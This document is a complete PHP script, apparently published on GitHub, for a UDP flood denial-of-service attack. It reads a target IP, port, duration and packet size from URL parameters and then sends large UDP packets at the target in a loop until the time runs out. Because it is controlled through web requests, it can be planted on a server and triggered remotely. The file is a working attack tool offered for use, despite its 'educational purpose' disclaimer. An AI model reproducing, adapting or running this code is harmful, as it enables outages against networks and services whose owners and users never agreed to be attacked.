<?php

/**
 *
 * Script to perform a DoS UDP Flood
 *
 * @link https://github.com/brielmayer/dos-php-script The DDoS UDP flood GitHub project
 * @author Patrick (c0re^) Brielmayer
 * @license http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt GPLv2
 *
 * This tool is written on educational purpose, please use it on your own good faith.
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 *
 */

error_reporting(E_ERROR | E_WARNING);

ini_set('max_execution_time', 0);

class DoS {

    /**
     * Target host, e.g. 127.0.0.1
     * @var string
     */
    private $host;

    /**
     * Target port, e.g. 443
     * @var
     */
    private $port;

    /**
     * Flood time in seconds
     * @var int
     */
    private $time;

    /**
     * Packet size in bytes
     * @var int
     */
    private $size;

    /**
     * DoS constructor.
     * @param $host string Target host
     * @param $port int Target port
     * @param $time int Flood time in Seconds
     * @param $size int Packet size in bytes
     */
    public function __construct($host, $port, $time, $size)
    {
        if(!filter_var($host, FILTER_VALIDATE_IP)) throw new InvalidArgumentException("host missing or incorrect format");
        if(!filter_var($port, FILTER_VALIDATE_INT)) throw new InvalidArgumentException("port incorrect format");
        if(!filter_var($time, FILTER_VALIDATE_INT)) throw new InvalidArgumentException("time missing or incorrect format");
        if(!filter_var($size, FILTER_VALIDATE_INT)) throw new InvalidArgumentException("size incorrect format");

        $this->host = $host;
        $this->port = $port;
        $this->time = $time;
        $this->size = $size;
    }

    /**
     * Starts UPD attack
     * @return int Amount of bytes sent
     */
    public function flood() {
        $packet = str_repeat("0", $this->size);
        $start_time = time();
        $end_time = $start_time + $this->time;
        for($packets = 1; time() <= $end_time; ++$packets)
        {
            $f_sock = fsockopen("udp://$this->host", $this->port, $errno, $errmsg, 30);
            fwrite($f_sock, $packet);
            fclose($f_sock);
        }
        return $packets * $this->size;
    }
}

/** Main Application */
$host = $_GET['host']; // required
$port = isset($_GET['port']) ? $_GET['port'] : 80; // optional, default 80
$time = $_GET['time']; // required
$size = isset($_GET['size']) ? $_GET['size'] : 65000; // optional, default 65000

$result = null;
try {
    $dos = new DoS($host, $port, $time, $size);
    $bytes = $dos->flood();
    $result = array("success" => "true", "bytes_sent" => $bytes);
} catch (InvalidArgumentException $e) {
    $result = array("success" => "false", "error" => $e->getMessage());
} finally {
    echo json_encode($result);
}

